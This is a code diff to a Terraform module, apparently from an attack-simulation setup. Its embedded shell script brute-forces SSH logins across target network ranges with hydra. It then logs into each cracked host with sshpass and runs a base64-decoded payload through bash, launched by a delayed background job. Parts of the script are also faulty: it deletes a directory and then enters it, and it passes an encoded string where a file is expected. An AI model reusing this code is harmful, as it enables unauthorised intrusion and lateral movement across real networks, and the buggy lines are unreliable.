@@ -1,12 +1,20 @@
 locals {
     attack_dir = "/hydra"
+    attack_script = "hydra.sh"
+    start_script = "delayed_start.sh"
+    lock_file = "/tmp/delay_hydra.lock"
     targets = flatten([ for target in var.targets: can(split("/", target)[1]) ? 
         [ for host_number in range(pow(2, 32 - split("/", target)[1])) : cidrhost(target, host_number) ]
         :
         [ target ]
     ])
+    base64_command_payload = base64encode(var.payload)
     payload = <<-EOT
-    set -e
+    LOCKFILE="${ local.lock_file }"
+    if [ -e "$LOCKFILE" ]; then
+        echo "Another instance of the script is already running. Exiting..."
+        exit 1
+    fi
     LOGFILE=/tmp/${var.tag}.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
@@ -26,6 +34,14 @@ locals {
         sleep 120
     done
     log "docker path: $(which docker)"
+
+    log "cleaning app directory"
+    rm -rf ${local.attack_dir}
+    cd ${local.attack_dir}
+    echo ${local.delayed_start} | base64 -d > ${local.start_script}
+
+    log "creating ${local.attack_script}..."
+    cat > ${local.attack_script} <<-'COF'
     apt-get update && apt-get install -y sshpass jq
     truncate -s 0 /tmp/hydra.txt
     LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
@@ -73,13 +89,30 @@ locals {
         host=$(echo "$line" | awk '{print $3}')
         username=$(echo "$line" | awk '{print $6}')
         password=$(echo "$line" | awk '{print $8}')
-        log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'touch /tmp/hydra-pwned.txt'"
-        sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'touch /tmp/hydra-pwned.txt'
+        log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'base64 -d ${base64_command_payload} | /bin/bash"
+        sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'base64 -d ${base64_command_payload} | /bin/bash'
         log "Done"
     done < <(grep -v "^#" /tmp/hydra-found.txt | sort | uniq)
     log "Done."
+    COF
+
+    log "starting background delayed script start..."
+    nohup /bin/bash ${local.start_script} >/dev/null 2>&1 &
+    log "background job started"
+    log "done."
+
     EOT
     base64_payload = base64encode(local.payload)
+
+    delayed_start   = base64encode(templatefile(
+                                "${path.module}/resources/${local.start_script}",
+                                {
+                                    lock_file = local.lock_file
+                                    attack_delay = var.attack_delay
+                                    attack_dir = local.attack_dir
+                                    attack_script = local.attack_script
+                                }
+                        ))
 }
 
 ###########################
